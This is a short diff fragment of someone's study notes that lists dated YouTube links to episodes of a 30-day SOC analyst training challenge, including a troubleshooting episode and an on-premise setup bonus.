+  https://youtu.be/Ec-Ab8TbJKs?si=Pmdg9EbB-6BVOUUU
+
+
+
+_____________________________________________________________________
+10/12/2024
+Troubleshooting 30-Day MyDFIR SOC Analyst Challenge | Day 29 (really day 30. just a typo...)
+  https://youtu.be/o-eR-tJlbqE?si=KJbZtpEudiPDXSkd
+
+(very interesting)
+
+
+_____________________________________________________________________
+10/13/2024
+On-Premise Setup Tutorial 30-Day MyDFIR SOC Analyst Challenge | BONUS (day 31)
+  https://youtu.be/GWX19cpv21w?si=nhZ8IWIqK1Bk5Ecy
+
+
 temp
